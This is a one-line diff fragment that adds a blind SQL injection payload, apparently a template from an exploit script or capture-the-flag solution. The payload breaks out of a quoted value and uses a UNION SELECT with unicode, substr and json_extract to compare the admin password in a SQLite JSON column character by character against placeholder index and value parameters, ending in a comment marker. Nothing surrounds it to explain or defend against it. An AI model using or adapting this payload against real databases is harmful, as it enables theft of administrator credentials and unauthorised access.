@@ -1,0 +1,1 @@
+") AS _, 'true' AS password FROM db WHERE unicode(substr( json_extract(users, '$.admin.password'), index )) < value UNION SELECT 'pad' AS _, 'false' AS password FROM db  --
